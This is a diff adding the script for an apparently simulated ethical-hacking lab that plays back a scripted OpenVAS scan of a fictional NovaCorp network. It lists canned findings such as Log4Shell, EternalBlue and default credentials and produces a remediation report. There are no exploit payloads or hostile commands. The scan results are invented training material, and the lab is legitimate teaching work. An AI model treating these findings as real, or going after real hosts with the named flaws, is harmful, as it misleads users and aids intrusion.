+    taskTargetSel.innerHTML = `<option value="">-- Select Target --</option><option value="${escapeHtml(name)}" selected>${escapeHtml(name)}</option>`;
+
+    cancelTargetForm();
+    addActivity('Target "' + name + '" configured (' + hosts + ')', '#10b981');
+    markObjective(0); // Objective 1: Configure target
+    state.targetCreated = true;
+    showToast('Target "' + name + '" created successfully', 'success');
+}
+
+// ════════════════════════════════════════════════════════
+//  TASK FORM
+// ════════════════════════════════════════════════════════
+function showTaskForm() {
+    if (!state.targetCreated) {
+        showToast('Create a target first before adding a task.', 'warn');
+        switchPanel('targets', document.querySelector('[data-panel="targets"]'));
+        return;
+    }
+    document.getElementById('taskForm').style.display = 'block';
+    document.getElementById('newTaskBtn').style.display = 'none';
+}
+
+function cancelTaskForm() {
+    document.getElementById('taskForm').style.display = 'none';
+    document.getElementById('newTaskBtn').style.display = 'inline-flex';
+}
+
+function submitTask() {
+    const name    = document.getElementById('taskName').value.trim();
+    const target  = document.getElementById('taskTarget').value;
+    const scanner = document.getElementById('taskScanner').value;
+    const config  = document.getElementById('taskConfig').value;
+
+    let valid = true;
+
+    if (!name) {
+        document.getElementById('taskName').classList.add('error');
+        document.getElementById('taskNameErr').classList.add('visible');
+        valid = false;
+    } else {
+        document.getElementById('taskName').classList.remove('error');
+        document.getElementById('taskNameErr').classList.remove('visible');
+    }
+
+    if (!target) {
+        document.getElementById('taskTargetErr').classList.add('visible');
+        valid = false;
+    } else {
+        document.getElementById('taskTargetErr').classList.remove('visible');
+    }
+
+    if (!scanner) {
+        document.getElementById('taskScannerErr').classList.add('visible');
+        valid = false;
+    } else {
+        document.getElementById('taskScannerErr').classList.remove('visible');
+    }
+
+    if (!config) {
+        document.getElementById('taskConfigErr').classList.add('visible');
+        valid = false;
+    } else {
+        document.getElementById('taskConfigErr').classList.remove('visible');
+    }
+
+    if (!valid) return;
+
+    const configLabels = {
+        full_fast: 'Full and fast',
+        full_deep: 'Full and very deep',
+        host_discovery: 'Host Discovery',
+        system_discovery: 'System Discovery'
+    };
+
+    createdTask = { name, target, scanner, config, status: 'new', progress: 0 };
+
+    renderTasksTable();
+    cancelTaskForm();
+    addActivity('Task "' + name + '" created — config: ' + configLabels[config], '#a855f7');
+    markObjective(1); // Objective 2: Create task
+    state.taskCreated = true;
+    showToast('Task "' + name + '" created. Click Start to begin scanning.', 'success');
+}
+
+// ════════════════════════════════════════════════════════
+//  TASKS TABLE RENDERING
+// ════════════════════════════════════════════════════════
+function renderTasksTable() {
+    if (!createdTask) return;
+
+    const configLabels = {
+        full_fast: 'Full and fast',
+        full_deep: 'Full and very deep',
+        host_discovery: 'Host Discovery',
+        system_discovery: 'System Discovery'
+    };
+
+    const statusHtml = {
+        new:       '<span class="task-status new">New</span>',
+        requested: '<span class="task-status requested"><span class="status-dot pulse" style="background:#eab308; display:inline-block; width:6px; height:6px; border-radius:50%;"></span> Requested</span>',
+        running:   '<span class="task-status running"><span class="status-dot pulse" style="background:#10b981; display:inline-block; width:6px; height:6px; border-radius:50%;"></span> Running</span>',
+        done:      '<span class="task-status done">Done</span>'
+    };
+
+    const actionBtn = createdTask.status === 'new' || createdTask.status === 'requested'
+        ? `<button class="gsa-btn gsa-btn-success" onclick="startScan()" ${createdTask.status !== 'new' ? 'disabled' : ''}>Start</button>`
+        : createdTask.status === 'running'
+        ? `<button class="gsa-btn gsa-btn-danger" disabled>Running...</button>`
+        : `<button class="gsa-btn gsa-btn-ghost" onclick="switchPanel('results', document.querySelector('[data-panel=results]'))">View Results</button>`;
+
+    const progressBar = `
+        <div style="width:100px;">
+            <div style="height:5px; background:#21262d; border-radius:3px; overflow:hidden;">
+                <div id="taskProgressBar" style="height:100%; width:${createdTask.progress}%; background:linear-gradient(90deg,#7c3aed,#a855f7); border-radius:3px; transition:width 0.3s;"></div>
+            </div>
+            <div style="font-size:0.65rem; color:#6b7280; margin-top:3px; text-align:right;" id="taskProgressPct">${createdTask.progress}%</div>
+        </div>
+    `;
+
+    document.getElementById('tasksTableBody').innerHTML = `
+        <tr>
+            <td>${escapeHtml(createdTask.name)}</td>
+            <td>${escapeHtml(createdTask.target)}</td>
+            <td>${configLabels[createdTask.config] || createdTask.config}</td>
+            <td id="taskStatusCell">${statusHtml[createdTask.status] || ''}</td>
+            <td>${progressBar}</td>
+            <td id="taskActionCell">${actionBtn}</td>
+        </tr>
+    `;
+}
+
+// ════════════════════════════════════════════════════════
+//  SCAN ENGINE
+// ════════════════════════════════════════════════════════
+const SCAN_LOG_ENTRIES = [
+    { t: 200,  cls: 'info',    msg: '[OpenVAS] Scanner initializing... loading NVT cache (58,841 NVTs)' },
+    { t: 600,  cls: 'info',    msg: '[Host Discovery] ICMP ping sweep on 10.0.1.0/24...' },
+    { t: 1000, cls: 'success', msg: '[Host Discovery] Active host: 10.0.1.1 (Gateway/Router)' },
+    { t: 1200, cls: 'success', msg: '[Host Discovery] Active host: 10.0.1.10 (Web/App Server)' },
+    { t: 1400, cls: 'success', msg: '[Host Discovery] Active host: 10.0.1.20 (Mail/Web Server)' },
+    { t: 1600, cls: 'success', msg: '[Host Discovery] Active host: 10.0.1.30 (Windows Server)' },
+    { t: 1800, cls: 'success', msg: '[Host Discovery] Active host: 10.0.1.40 (Database Server)' },
+    { t: 2000, cls: 'success', msg: '[Host Discovery] Active host: 10.0.1.100 (Printer)' },
+    { t: 2200, cls: 'info',    msg: '[Port Scan] Scanning 6 active hosts on all TCP/UDP ports...' },
+    { t: 2800, cls: 'info',    msg: '[NVT Engine] Running vulnerability checks against 10.0.1.10...' },
+    { t: 3200, cls: 'warn',    msg: '[10.0.1.10:8080] Log4j JNDI lookup feature detected — testing CVE-2021-44228...' },
+    { t: 3600, cls: 'error',   msg: '[10.0.1.10:8080] CONFIRMED: CVE-2021-44228 (Log4Shell) — CVSS 10.0 CRITICAL' },
+    { t: 4000, cls: 'warn',    msg: '[10.0.1.30:445] SMBv1 enabled — testing MS17-010 (EternalBlue)...' },
+    { t: 4300, cls: 'error',   msg: '[10.0.1.30:445] CONFIRMED: MS17-010 (EternalBlue) — CVSS 9.8 CRITICAL' },
+    { t: 4600, cls: 'warn',    msg: '[10.0.1.10:8090] Confluence detected — testing CVE-2023-22515...' },
+    { t: 4900, cls: 'error',   msg: '[10.0.1.10:8090] CONFIRMED: CVE-2023-22515 (Confluence RCE) — CVSS 9.8 CRITICAL' },
+    { t: 5100, cls: 'warn',    msg: '[10.0.1.30:21] FTP anonymous login accepted' },
+    { t: 5300, cls: 'warn',    msg: '[10.0.1.40:3306] MySQL authentication with default credentials succeeded' },
+    { t: 5500, cls: 'info',    msg: '[10.0.1.10:80] Apache version 2.4.49 detected — multiple CVEs applicable' },
+    { t: 5700, cls: 'info',    msg: '[NVT Engine] Running checks against 10.0.1.20...' },
+    { t: 6000, cls: 'warn',    msg: '[10.0.1.20:443] TLSv1.0/1.1 supported — weak cipher suites detected' },
+    { t: 6200, cls: 'warn',    msg: '[10.0.1.20:25] SMTP open relay confirmed — accepted relayed test message' },
+    { t: 6400, cls: 'info',    msg: '[10.0.1.1:161] SNMPv1 community "public" — full MIB tree accessible' },
+    { t: 6600, cls: 'info',    msg: '[10.0.1.100:80] Default web UI credentials accepted (admin/admin)' },
+    { t: 6900, cls: 'success', msg: '[OpenVAS] Scan complete. 28 vulnerabilities identified across 6 hosts.' }
+];
+
+function startScan() {
+    if (state.scanRunning || state.scanComplete) return;
+    state.scanRunning = true;
+    markObjective(2); // Objective 3: Execute scan
+
+    // Set status to "Requested"
+    createdTask.status = 'requested';
+    renderTasksTable();
+    updateGsaStatus('running');
+    addActivity('Scan started: ' + createdTask.name, '#10b981');
+
+    // Small delay then "Running"
+    setTimeout(() => {
+        createdTask.status = 'running';
+        renderTasksTable();
+    }, 400);
+
+    // Show scan progress panel
+    injectScanProgress();
+
+    // Animate progress bar
+    const totalMs   = 7200; // 7.2 seconds total sim time
+    const startTime = Date.now();
+
+    const progressInterval = setInterval(() => {
+        const elapsed = Date.now() - startTime;
+        const pct = Math.min(100, Math.round((elapsed / totalMs) * 100));
+        createdTask.progress = pct;
+
+        const bar = document.getElementById('taskProgressBar');
+        const pctEl = document.getElementById('taskProgressPct');
+        if (bar) bar.style.width = pct + '%';
+        if (pctEl) pctEl.textContent = pct + '%';
+
+        const scanFill = document.getElementById('scanBarFill');
+        const scanPct  = document.getElementById('scanProgressPct');
+        if (scanFill) scanFill.style.width = pct + '%';
+        if (scanPct)  scanPct.textContent  = pct + '%';
+
+        if (pct >= 100) {
+            clearInterval(progressInterval);
+            onScanComplete();
+        }
+    }, 100);
+
+    // Schedule log entries
+    SCAN_LOG_ENTRIES.forEach(entry => {
+        setTimeout(() => {
+            appendScanLog(entry.msg, entry.cls);
+        }, entry.t);
+    });
+}
+
+function injectScanProgress() {
+    // Switch to Tasks panel to show progress
+    const tasksPanel = document.getElementById('panel-tasks');
+    const existing   = document.getElementById('scanProgressBlock');
+    if (existing) existing.remove();
+
+    const block = document.createElement('div');
+    block.id = 'scanProgressBlock';
+    block.style.marginTop = '20px';
+    block.innerHTML = `
+        <div class="scan-progress-wrap">
+            <div class="scan-progress-label">
+                <span class="scan-progress-title">Scanning NovaCorp Internal (10.0.1.0/24)</span>
+                <span class="scan-progress-pct" id="scanProgressPct">0%</span>
+            </div>
+            <div class="scan-bar-track">
+                <div class="scan-bar-fill" id="scanBarFill"></div>
+            </div>
+            <div style="display:flex; gap:20px; margin-top:10px; font-size:0.7rem; color:#6b7280;">
+                <span>Scanner: OpenVAS Default</span>
+                <span>Config: Full and fast</span>
+                <span>Target: 10.0.1.0/24</span>
+                <span id="scanStatusLabel">Status: Initializing...</span>
+            </div>
+        </div>
+        <div style="font-size:0.7rem; color:#6b7280; margin-bottom:6px; letter-spacing:0.05em;">Live Output</div>
+        <div class="scan-log" id="scanLog"></div>
+    `;
+    tasksPanel.appendChild(block);
+}
+
+function appendScanLog(msg, cls) {
+    const log = document.getElementById('scanLog');
+    if (!log) return;
+    const line = document.createElement('span');
+    line.className = 'log-line ' + (cls || '');
+    const ts = new Date().toLocaleTimeString('en-US', { hour12: false });
+    line.textContent = '[' + ts + '] ' + msg;
+    log.appendChild(line);
+    log.appendChild(document.createElement('br'));
+    log.scrollTop = log.scrollHeight;
+}
+
+function onScanComplete() {
+    state.scanRunning  = false;
+    state.scanComplete = true;
+    createdTask.status = 'done';
+    createdTask.progress = 100;
+
+    updateGsaStatus('done');
+    renderTasksTable();
+    updateDashboardCounts();
+    enableGenerateReport();
+    addActivity('Scan complete — 28 vulnerabilities found (3 Critical)', '#ef4444');
+
+    const statusLabel = document.getElementById('scanStatusLabel');
+    if (statusLabel) statusLabel.textContent = 'Status: Complete';
+
+    // Objective 4: Identify 3 critical vulns — mark when scan done (they can see the count)
+    setTimeout(() => markObjective(3), 1200);
+
+    // Identify highest-risk host objective after results are viewed
+    setTimeout(() => markObjective(6), 2000);
+
+    showToast('Scan complete! 28 vulnerabilities found.', 'success');
+}
+
+// ════════════════════════════════════════════════════════
+//  RESULTS RENDERING
+// ════════════════════════════════════════════════════════
+function renderResults() {
+    if (!state.scanComplete) return;
+
+    const sortBy = document.getElementById('sortSelect').value;
+    const sorted = [...VULNS].sort((a, b) => {
+        if (sortBy === 'severity') return SEVERITY_ORDER[a.severity] - SEVERITY_ORDER[b.severity];
+        if (sortBy === 'cvss')     return b.cvss - a.cvss;
+        if (sortBy === 'host')     return a.host.localeCompare(b.host);
+        return 0;
+    });
+
+    document.getElementById('resultsEmpty').style.display = 'none';
+    document.getElementById('resultsTableWrap').style.display = 'block';
+
+    const tbody = document.getElementById('resultsTableBody');
+    tbody.innerHTML = '';
+
+    sorted.forEach(v => {
+        const sevClass  = v.severity.toLowerCase();
+        const cvssClass = v.cvss >= 9 ? 'cvss-crit' : v.cvss >= 7 ? 'cvss-high' : v.cvss >= 4 ? 'cvss-med' : 'cvss-low';
+
+        // Main row
+        const tr = document.createElement('tr');
+        tr.className = 'clickable';
+        tr.setAttribute('data-id', v.id);
+        tr.onclick = function() { toggleDetail(v.id, this); };
+        tr.innerHTML = `
+            <td><span class="badge badge-${sevClass}">${v.severity}</span></td>
+            <td style="font-weight:500;">${escapeHtml(v.name)}</td>
+            <td><code style="font-family:monospace; color:#a855f7; font-size:0.78rem;">${v.host}</code></td>
+            <td style="color:#9ca3af;">${v.port}</td>
+            <td><span class="${cvssClass}">${v.cvss.toFixed(1)}</span></td>
+            <td style="color:#6b7280; font-size:0.75rem;">${escapeHtml(v.solution)}</td>
+        `;
+        tbody.appendChild(tr);
+
+        // Detail row (hidden by default)
+        const cvssBarColor = v.cvss >= 9 ? '#ef4444' : v.cvss >= 7 ? '#f97316' : v.cvss >= 4 ? '#eab308' : '#3b82f6';
+        const cvssWidth    = (v.cvss / 10 * 100).toFixed(0);
+        const refsHtml     = v.refs.map(r => `<code style="font-size:0.72rem; color:#6b7280; background:#21262d; padding:1px 5px; border-radius:3px;">${escapeHtml(r)}</code>`).join(' ');
+
+        const detailTr = document.createElement('tr');
+        detailTr.className = 'row-detail';
+        detailTr.id = 'detail-' + v.id;
+        detailTr.innerHTML = `
+            <td colspan="6">
+                <div class="detail-grid">
+                    <div class="detail-section">
+                        <h4>Description</h4>
+                        <p>${escapeHtml(v.description)}</p>
+                    </div>
+                    <div class="detail-section">
+                        <h4>CVSS Score: ${v.cvss.toFixed(1)} / 10.0</h4>
+                        <div class="detail-cvss-bar">
+                            <div class="detail-cvss-fill" style="width:${cvssWidth}%; background:${cvssBarColor};"></div>
+                        </div>
+                        <p style="margin-top:8px;">Severity: <strong style="color:${cvssBarColor};">${v.severity}</strong></p>
+                        <p>Host: <code style="color:#a855f7; font-family:monospace;">${v.host}:${v.port}</code></p>
+                    </div>
+                    <div class="detail-section">
+                        <h4>Business Impact</h4>
+                        <p>${escapeHtml(v.impact)}</p>
+                    </div>
+                    <div class="detail-section">
+                        <h4>Remediation</h4>
+                        <p>${escapeHtml(v.remediation)}</p>
+                    </div>
+                    <div class="detail-section full">
+                        <h4>References</h4>
+                        <p>${refsHtml}</p>
+                    </div>
+                </div>
+            </td>
+        `;
+        tbody.appendChild(detailTr);
+    });
+}
+
+function toggleDetail(vulnId, rowEl) {
+    const detailRow = document.getElementById('detail-' + vulnId);
+    if (!detailRow) return;
+
+    const isOpen = detailRow.classList.contains('open');
+    // Close all other open details
+    document.querySelectorAll('.row-detail.open').forEach(r => r.classList.remove('open'));
+
+    if (!isOpen) {
+        detailRow.classList.add('open');
+
+        // Track specific objectives
+        if (vulnId === 'log4shell' && !state.objectives[4]) {
+            markObjective(4); // Obj 5: Review Log4Shell
+        }
+        if (vulnId === 'eternalblue' && !state.objectives[5]) {
+            markObjective(5); // Obj 6: Review EternalBlue
+        }
+    }
+}
+
+// ════════════════════════════════════════════════════════
+//  DASHBOARD COUNTS
+// ════════════════════════════════════════════════════════
+function updateDashboardCounts() {
+    const counts = { Critical: 0, High: 0, Medium: 0, Low: 0 };
+    VULNS.forEach(v => { counts[v.severity] = (counts[v.severity] || 0) + 1; });
+
+    document.getElementById('dashCrit').textContent = counts.Critical;
+    document.getElementById('dashHigh').textContent = counts.High;
+    document.getElementById('dashMed').textContent  = counts.Medium;
+    document.getElementById('dashLow').textContent  = counts.Low;
+}
+
+// ════════════════════════════════════════════════════════
+//  STATUS BAR
+// ════════════════════════════════════════════════════════
+function updateGsaStatus(mode) {
+    const pill    = document.getElementById('gsaStatusPill');
+    const dot     = document.getElementById('statusDot');
+    const textEl  = document.getElementById('statusText');
+
+    pill.className = 'gsa-status-pill ' + mode;
+    if (mode === 'running') {
+        dot.classList.add('pulse');
+        textEl.textContent = 'Scanning...';
+    } else if (mode === 'done') {
+        dot.classList.remove('pulse');
+        textEl.textContent = 'Scan Complete';
+    } else {
+        dot.classList.remove('pulse');
+        textEl.textContent = 'Idle';
+    }
+}
+
+// ════════════════════════════════════════════════════════
+//  ACTIVITY FEED
+// ════════════════════════════════════════════════════════
+function addActivity(msg, color) {
+    const feed = document.getElementById('activityFeed');
+    const ts   = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
+    const item = document.createElement('div');
+    item.className = 'feed-item';
+    item.innerHTML = `
+        <div class="feed-dot" style="background:${color || '#6b7280'};"></div>
+        <span class="feed-text">${escapeHtml(msg)}</span>
+        <span class="feed-time">${ts}</span>
+    `;
+    feed.prepend(item);
+}
+
+// ════════════════════════════════════════════════════════
+//  REPORT GENERATION
+// ════════════════════════════════════════════════════════
+function enableGenerateReport() {
+    const btn = document.getElementById('generateReportBtn');
+    if (btn) btn.removeAttribute('disabled');
+}
+
+function generateReport() {
+    if (!state.scanComplete) return;
+
+    markObjective(7); // Obj 8: Generate report
+    state.reportViewed = true;
+    addActivity('Vulnerability assessment report generated', '#a855f7');
+
+    const criticalVulns = VULNS.filter(v => v.severity === 'Critical');
+    const highVulns     = VULNS.filter(v => v.severity === 'High');
+
+    const critRows = criticalVulns.map(v => `
+        <div style="padding:10px 0; border-bottom:1px solid #21262d;">
+            <div style="display:flex; align-items:center; gap:8px; margin-bottom:4px;">
+                <span class="badge badge-critical">Critical</span>
+                <strong style="color:#e5e7eb; font-size:0.82rem;">${escapeHtml(v.name)}</strong>
+                <span style="color:#ef4444; font-weight:700; margin-left:auto;">CVSS ${v.cvss.toFixed(1)}</span>
+            </div>
+            <div style="font-size:0.75rem; color:#9ca3af; margin-left:4px;">Host: <code style="color:#a855f7; font-family:monospace;">${v.host}:${v.port}</code> — ${escapeHtml(v.solution)}</div>
+        </div>
+    `).join('');
+
+    const highRows = highVulns.map(v => `
+        <div style="padding:8px 0; border-bottom:1px solid #21262d;">
+            <div style="display:flex; align-items:center; gap:8px;">
+                <span class="badge badge-high">High</span>
+                <span style="color:#d1d5db; font-size:0.8rem;">${escapeHtml(v.name)}</span>
+                <span style="color:#f97316; font-weight:700; margin-left:auto;">CVSS ${v.cvss.toFixed(1)}</span>
+            </div>
+            <div style="font-size:0.72rem; color:#6b7280; margin-left:4px;">${v.host}:${v.port} — ${escapeHtml(v.solution)}</div>
+        </div>
+    `).join('');
+
+    const reportHtml = `
+        <div class="report-section">
+            <h3>Vulnerability Assessment Report — NovaCorp Internal Network</h3>
+            <p><strong style="color:#e5e7eb;">Organization:</strong> NovaCorp Technologies</p>
+            <p><strong style="color:#e5e7eb;">Scope:</strong> 10.0.1.0/24 (Internal Network — 6 active hosts)</p>
+            <p><strong style="color:#e5e7eb;">Scanner:</strong> OpenVAS 22.4 — Full and fast configuration</p>
+            <p><strong style="color:#e5e7eb;">Date:</strong> 2026-02-25 &nbsp; <strong style="color:#e5e7eb;">Analyst:</strong> analyst@novacorp.lab</p>
+        </div>
+
+        <div class="report-section">
+            <h3>Executive Summary</h3>
+            <p>A comprehensive vulnerability assessment of the NovaCorp internal network (10.0.1.0/24) identified <strong style="color:#ef4444;">28 vulnerabilities</strong> across 6 active hosts. The findings represent a <strong style="color:#ef4444;">critical risk posture</strong> requiring immediate remediation action.</p>
+            <p>Three critical vulnerabilities were identified that pose an immediate risk of complete system compromise. The web application server (10.0.1.10) presents the highest concentration of vulnerabilities and should be prioritized for emergency patching. The Windows server (10.0.1.30) is vulnerable to the EternalBlue exploit, which has been actively weaponized in multiple ransomware campaigns.</p>
+
+            <div class="report-exec-metrics">
+                <div class="exec-metric critical">
+                    <div class="exec-metric-num">3</div>
+                    <div class="exec-metric-label">Critical</div>
+                </div>
+                <div class="exec-metric high">
+                    <div class="exec-metric-num">5</div>
+                    <div class="exec-metric-label">High</div>
+                </div>
+                <div class="exec-metric medium">
+                    <div class="exec-metric-num">8</div>
+                    <div class="exec-metric-label">Medium</div>
+                </div>
+                <div class="exec-metric low">
+                    <div class="exec-metric-num">12</div>
+                    <div class="exec-metric-label">Low</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-section">
+            <h3>Critical Findings — Immediate Action Required</h3>
+            ${critRows}
+        </div>
+
+        <div class="report-section">
+            <h3>High-Risk Findings</h3>
+            ${highRows}
+        </div>
+
+        <div class="report-section">
+            <h3>Risk Prioritization — Highest Risk Host</h3>
+            <p>The host <code style="color:#a855f7; font-family:monospace; font-size:0.85rem;">10.0.1.10</code> (Web/App Server) carries the highest aggregate risk, hosting <strong style="color:#ef4444;">2 critical</strong> and <strong style="color:#f97316;">4 high</strong> severity findings. This host should be the first priority for emergency patching and potential isolation from the production network during remediation.</p>
+            <div style="background:#0d1117; border:1px solid #30363d; border-radius:5px; padding:12px; margin-top:10px; font-family:monospace; font-size:0.75rem; color:#9ca3af; line-height:1.8;">
+                <span style="color:#a855f7;">10.0.1.10</span> — 2 Critical, 4 High, 4 Medium, 2 Low<br>
+                <span style="color:#ef4444;">10.0.1.30</span> — 1 Critical, 1 High, 1 Medium, 2 Low<br>
+                <span style="color:#f97316;">10.0.1.40</span> — 0 Critical, 1 High, 0 Medium, 0 Low<br>
+                <span style="color:#eab308;">10.0.1.20</span> — 0 Critical, 0 High, 2 Medium, 0 Low<br>
+                <span style="color:#6b7280;">10.0.1.1  </span> — 0 Critical, 0 High, 1 Medium, 2 Low<br>
+                <span style="color:#6b7280;">10.0.1.100</span> — 0 Critical, 0 High, 1 Medium, 0 Low
+            </div>
+        </div>
+
+        <div class="report-section">
+            <h3>Remediation Roadmap</h3>
+            <p>The following remediation actions are recommended in priority order:</p>
+            <div style="margin-top:10px;">
+                <div class="remediation-item">
+                    <div class="remediation-priority" style="background:#ef4444;"></div>
+                    <div class="remediation-text"><strong>IMMEDIATE (within 24 hours):</strong> Isolate 10.0.1.30 from the network. Apply MS17-010 patch or disable SMBv1. Risk of ransomware propagation is critical.</div>
+                </div>
+                <div class="remediation-item">
+                    <div class="remediation-priority" style="background:#ef4444;"></div>
+                    <div class="remediation-text"><strong>IMMEDIATE (within 24 hours):</strong> Update Log4j to 2.17.1+ on 10.0.1.10. Apply JVM workaround parameter immediately as a stopgap.</div>
+                </div>
+                <div class="remediation-item">
+                    <div class="remediation-priority" style="background:#ef4444;"></div>
+                    <div class="remediation-text"><strong>IMMEDIATE (within 24 hours):</strong> Upgrade Atlassian Confluence on 10.0.1.10:8090 to 8.3.3+ or restrict external access.</div>
+                </div>
+                <div class="remediation-item">
+                    <div class="remediation-priority" style="background:#f97316;"></div>
+                    <div class="remediation-text"><strong>SHORT-TERM (within 1 week):</strong> Change default MySQL credentials on 10.0.1.40. Upgrade Apache on 10.0.1.10. Disable FTP anonymous login on 10.0.1.30.</div>
+                </div>
+                <div class="remediation-item">
+                    <div class="remediation-priority" style="background:#eab308;"></div>
+                    <div class="remediation-text"><strong>MEDIUM-TERM (within 1 month):</strong> Disable TLS 1.0/1.1. Fix SMTP open relay configuration. Add HTTP security headers. Disable SNMPv1. Enable RDP NLA.</div>
+                </div>
+                <div class="remediation-item">
+                    <div class="remediation-priority" style="background:#3b82f6;"></div>
+                    <div class="remediation-text"><strong>ONGOING:</strong> Implement a vulnerability management program with quarterly assessments. Deploy endpoint detection and response (EDR) on all hosts.</div>
+                </div>
+            </div>
+        </div>
+    `;
+
+    document.getElementById('reportEmpty').style.display = 'none';
+    document.getElementById('reportContent').innerHTML = reportHtml;
+    document.getElementById('reportContent').style.display = 'block';
+
+    showToast('Report generated successfully.', 'success');
+}
+
+// ════════════════════════════════════════════════════════
+//  LAB COMPLETION
+// ════════════════════════════════════════════════════════
+function completelab() {
+    if (typeof ModuleProgress !== 'undefined') {
+        ModuleProgress.complete('dark-arts', 'ehe-lab-vuln-assessment', { returnUrl: '../index.html' });
+    } else {
+        window.location.href = '../index.html';
+    }
+}
+
+// ════════════════════════════════════════════════════════
+//  TOAST
+// ════════════════════════════════════════════════════════
+function showToast(msg, type) {
+    const container = document.getElementById('toast-container');
+    const toast = document.createElement('div');
+    toast.className = 'toast ' + (type || 'info');
+    toast.textContent = msg;
+    container.appendChild(toast);
+    setTimeout(() => {
+        toast.style.opacity = '0';
+        toast.style.transition = 'opacity 0.3s';
+        setTimeout(() => toast.remove(), 300);
+    }, 3000);
+}
+
+// ════════════════════════════════════════════════════════
+//  UTILITY
+// ════════════════════════════════════════════════════════
+function escapeHtml(str) {
+    if (!str) return '';
+    return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#039;');
+}
+
+// ════════════════════════════════════════════════════════
+//  RESULTS PANEL ACTIVATION — render when switched to
+// ════════════════════════════════════════════════════════
+(function patchSwitchPanel() {
+    const original = window.switchPanel;
+    window.switchPanel = function(panelId, navEl) {
+        original(panelId, navEl);
+        if (panelId === 'results' && state.scanComplete) {
+            renderResults();
+        }
+    };
+})();
+
+// ════════════════════════════════════════════════════════
+//  INIT
+// ════════════════════════════════════════════════════════
+renderObjectives();
+updateObjectiveCount();
+</script>
+
+<script src="../../../../components/FluxCapacitor.js"></script>
+
+</body>
+</html>
